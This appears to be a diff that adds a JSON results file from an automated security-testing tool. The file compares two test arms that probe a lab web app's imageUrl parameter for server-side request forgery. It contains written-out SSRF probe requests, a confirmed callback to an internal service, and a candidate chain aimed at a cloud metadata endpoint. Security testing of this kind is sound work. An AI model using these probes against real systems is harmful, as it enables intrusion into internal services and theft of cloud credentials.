@@ -1,0 +1,76 @@
+{
+  "arm_b": {
+    "arm": "b",
+    "engagement_id": "568c6d83-b345-47a1-873d-9170d8ade041",
+    "cross_service_findings": [
+      {
+        "title": "Cross-Service Server-Side Request Forgery (SSRF) \u2014 A reaches internal service B \u2014 imageUrl",
+        "severity": "high",
+        "evidence": [
+          "Request: Cross-service SSRF http://localhost:3000/profile/image/url \u2014 imageUrl=http://host.docker.internal:18082/spgizgdz4k3s7k6nmbruh6kqne (targeting in-scope internal service B http://host.docker.internal:18082/)",
+          "Response: out-of-band callback bearing the probe nonce recorded AT B (http from 127.0.0.1) \u2014 A\u2192B reach confirmed",
+          "cross_service=A(http://localhost:3000/profile/image/url) \u2192 B(http://host.docker.internal:18082/) topology_source=recon reachability_grade=cross_service_topology",
+          "confirmation=P6 out-of-band callback recorded AT B (collaborator co-located with B) \u2014 proves A REACHES B, not merely that A egresses somewhere",
+          "confirmation=P6 target=http://host.docker.internal:18082/spgizgdz4k3s7k6nmbruh6kqne status=None",
+          "outbound_probe: POST http://localhost:3000/profile/image/url \u2014 imageUrl=http://host.docker.internal:18082/spgizgdz4k3s7k6nmbruh6kqne",
+          "callback_nonce='spgizgdz4k3s7k6nmbruh6kqne' (carried only in the one outbound probe; control_bore_it=False)",
+          "confirming_excerpt: inbound callback: proto=http src=127.0.0.1 host=host.docker.internal:18082 path=/spgizgdz4k3s7k6nmbruh6kqne received_at=1784824451.944",
+          "control [fresh single-use nonce minted but never sent to the target \u2014 the collaborator recorded no callback for it (proves the confirming callback is genuine inbound traffic, not a fabricated event)] status=None"
+        ]
+      }
+    ],
+    "research_leads": [],
+    "report_json": "outputs\\568c6d83-b345-47a1-873d-9170d8ade041\\report_568c6d83-b345-47a1-873d-9170d8ade041.json",
+    "report_md": "outputs\\568c6d83-b345-47a1-873d-9170d8ade041\\report_568c6d83-b345-47a1-873d-9170d8ade041.md",
+    "trace": "C:\\Users\\ptkva\\OneDrive\\Documents\\clinkz\\outputs\\568c6d83-b345-47a1-873d-9170d8ade041\\trace.jsonl"
+  },
+  "arm_c": {
+    "arm": "c",
+    "engagement_id": "81825e38-aa1c-4615-b259-78d72bf725ef",
+    "cross_service_findings": [],
+    "research_leads": [
+      {
+        "candidate_chain": "imageUrl@A(http://localhost:3000/profile/image/url) \u2192 egress(A) \u2192 A\u2192B[recon] \u2192 SSRF impact at http://internal-metadata:80/latest/meta-data/",
+        "why_unconfirmed": "egress_confirmed_but_B_reach_not_observed",
+        "a_endpoint": "http://localhost:3000/profile/image/url",
+        "a_channel": "imageUrl",
+        "b_target": "http://internal-metadata:80/latest/meta-data/",
+        "topology_source": "recon",
+        "reachability_grade": "cross_service_topology",
+        "reach_confidence": 0.25,
+        "raw_probe": "POST http://localhost:3000/profile/image/url \u2014 imageUrl=http://host.docker.internal:18082/qrjchkyshwahqz23lr3oa55a3y",
+        "raw_null_observation": "callback landed at collaborator 'host.docker.internal:18082' which is NOT co-located with B (http://internal-metadata:80/latest/meta-data/) \u2014 proves A egresses somewhere, NOT that A reaches internal service B",
+        "discovered_at": "2026-07-23T16:34:12.055262Z"
+      }
+    ],
+    "report_json": "outputs\\81825e38-aa1c-4615-b259-78d72bf725ef\\report_81825e38-aa1c-4615-b259-78d72bf725ef.json",
+    "report_md": "outputs\\81825e38-aa1c-4615-b259-78d72bf725ef\\report_81825e38-aa1c-4615-b259-78d72bf725ef.md",
+    "trace": "C:\\Users\\ptkva\\OneDrive\\Documents\\clinkz\\outputs\\81825e38-aa1c-4615-b259-78d72bf725ef\\trace.jsonl"
+  },
+  "edges": [
+    {
+      "hypothesis_id": "hyp:xsvc:egress_fetch.java_openconnection:imageUrl:http://host.docker.internal:18082/",
+      "a_endpoint": "http://localhost:3000/profile/image/url",
+      "a_channel": "imageUrl",
+      "b_target": "http://host.docker.internal:18082/",
+      "reachability_grade": "cross_service_topology",
+      "topology_source": "recon",
+      "reach_confidence": 0.25,
+      "rank_score": 0.1688,
+      "test_method": "_test_ssrf",
+      "sink_shape_id": "js.http_egress"
+    },
+    {
+      "hypothesis_id": "hyp:xsvc:egress_fetch.java_openconnection:imageUrl:http://internal-metadata:80/latest/meta-data/",
+      "a_endpoint": "http://localhost:3000/profile/image/url",
+      "a_channel": "imageUrl",
+      "b_target": "http://internal-metadata:80/latest/meta-data/",
+      "reachability_grade": "cross_service_topology",
+      "topology_source": "recon",
+      "reach_confidence": 0.25,
+      "rank_score": 0.1688,
+      "test_method": "_test_ssrf",
+      "sink_shape_id": "js.http_egress"
+    }
+  ]
+}
